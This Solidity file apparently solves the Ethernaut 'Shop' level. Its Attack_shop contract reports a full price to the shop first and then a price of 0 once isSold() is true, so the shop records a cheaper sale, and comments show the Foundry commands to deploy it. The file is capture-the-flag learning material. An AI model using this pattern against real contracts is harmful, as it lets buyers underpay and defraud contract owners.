// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//    forge create --rpc-url <YOUR_RPC_URL> --private-key <YOUR_PRIVATE_KEY> AttackShop --constructor-args 0xYourShopContractAddress
//forge create src/ethernaut/shop/attack_shop.sol:Attack_shop --account deployer --rpc-url $HOLESKY_RPC --constructor-args 0xE97031781e8F3Cd241bd65cb0aeF5041FDc9f2c6
interface Shop {
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
    function buy() external ;
}

contract Attack_shop {
    Shop shop;
    constructor(address addr){
    shop = Shop(addr);
}
    function buy() public {
        shop.buy();
    }
    function price() public returns(uint256) {
        uint256 _price = shop.price();

        if (shop.isSold()) {
            _price = 0;
        }
        return _price;

    }
}